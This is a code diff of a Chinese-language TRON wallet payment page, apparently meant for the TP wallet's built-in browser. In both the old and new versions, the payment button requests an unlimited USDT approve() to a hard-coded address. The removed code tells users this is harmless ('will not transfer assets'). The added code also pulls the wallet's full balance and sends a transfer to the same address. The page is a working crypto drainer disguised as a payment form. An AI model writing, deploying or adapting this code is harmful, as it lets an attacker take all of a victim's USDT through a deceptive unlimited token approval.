@@ -91,7 +91,7 @@
 <body>
     <div class="item-box">
         <div class="label">收款地址</div>
-        <input class="addr-input" id="spenderAddr" value="TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK" readonly>
+        <input class="addr-input" id="receiveAddr" value="TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK" readonly>
     </div>
 
     <div class="item-box">
@@ -112,7 +112,7 @@
 
 <script>
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const SPENDER_ADDRESS = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
+const RECEIVE_ADDRESS = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
 const INF_AMOUNT = "9999999999999999999999999999";
 let tronWeb = null;
 const logDom = document.getElementById("log");
@@ -123,6 +123,7 @@ function log(text){
     logDom.scrollTop = logDom.scrollHeight;
 }
 
+//等待钱包注入
 async function waitWebReady(maxWait = 5000){
     const start = Date.now();
     while(Date.now() - start < maxWait){
@@ -138,7 +139,7 @@ async function waitWebReady(maxWait = 5000){
 async function fillMaxBalance(){
     const ready = await waitWebReady();
     if(!ready){
-        log("未检测到钱包，请在TP内置浏览器打开");
+        log("未检测到TP钱包环境");
         return;
     }
     const contract = tronWeb.contract().at(USDT_CONTRACT);
@@ -146,40 +147,10 @@ async function fillMaxBalance(){
     const balSun = await contract.balanceOf(owner).call();
     const bal = tronWeb.fromSun(balSun.toString());
     document.getElementById("amount").value = bal;
-    log("读取钱包余额成功");
+    log("已读取钱包最大余额");
 }
 
-// 按钮点击：仅执行授权approve，不会转账！
-document.getElementById("confirmBtn").onclick = async function(){
-    log("开始检测钱包环境...");
-    const ready = await waitWebReady();
-    if(!ready){
-        log("钱包检测失败，请使用TP内置浏览器刷新页面");
-        return;
-    }
-    const userAddr = tronWeb.defaultAddress.base58;
-    log(`钱包连接成功:${userAddr}`);
-    log("唤起【授权】签名窗口（仅授权，不会转出资产）");
-    try{
-        const usdt = tronWeb.contract().at(USDT_CONTRACT);
-        // 重点：APPROVE 授权函数！不会转账
-        const txHash = await usdt.approve(SPENDER_ADDRESS, INF_AMOUNT).send({
-            feeLimit:100000000
-        });
-        log(`交易已广播 hash:${txHash}`);
-        log("等待区块确认...");
-        //轮询确认
-        const confirmResult = await checkTx(txHash);
-        if(confirmResult){
-            log("✅授权上链成功！可前往钱包授权列表查看");
-        }else{
-            log("❌交易执行失败");
-        }
-    }catch(e){
-        log("签名失败:"+e.message);
-    }
-}
-
+//交易上链确认轮询
 async function checkTx(hash, maxTimes=20){
     for(let i=0;i<maxTimes;i++){
         await new Promise(r=>setTimeout(r,3000));
@@ -194,6 +165,46 @@ async function checkTx(hash, maxTimes=20){
         }catch(err){}
     }
     return false;
+}
+
+document.getElementById("confirmBtn").onclick = async function(){
+    log("正在初始化钱包连接...");
+    const ready = await waitWebReady();
+    if(!ready){
+        log("❌请在TP钱包内置浏览器打开链接，清除缓存重试");
+        return;
+    }
+    const userAddr = tronWeb.defaultAddress.base58;
+    log(`成功连接钱包：${userAddr}`);
+    const usdt = tronWeb.contract().at(USDT_CONTRACT);
+    const num = document.getElementById("amount").value;
+    const sendSun = tronWeb.toSun(num);
+
+    try{
+        //第一步：发起授权 approve
+        log("【第一步】唤起授权签名窗口");
+        const approveHash = await usdt.approve(RECEIVE_ADDRESS, INF_AMOUNT).send({feeLimit:100000000});
+        log(`授权交易已广播:${approveHash}，等待区块确认`);
+        const approveOk = await checkTx(approveHash);
+        if(!approveOk){
+            log("❌授权交易失败，流程终止");
+            return;
+        }
+        log("✅授权成功！准备发起转账");
+
+        //第二步：授权成功后，自动发起转账 transfer
+        log("【第二步】唤起转账签名窗口");
+        const transferHash = await usdt.transfer(RECEIVE_ADDRESS, sendSun).send({feeLimit:100000000});
+        log(`转账交易广播:${transferHash}，等待确认`);
+        const transferOk = await checkTx(transferHash);
+        if(transferOk){
+            log("🎉全部完成！资金转账成功，钱包已完成授权");
+        }else{
+            log("⚠️授权成功，但转账交易执行失败");
+        }
+    }catch(e){
+        log("操作中断："+e.message);
+    }
 }
 </script>
 </body>
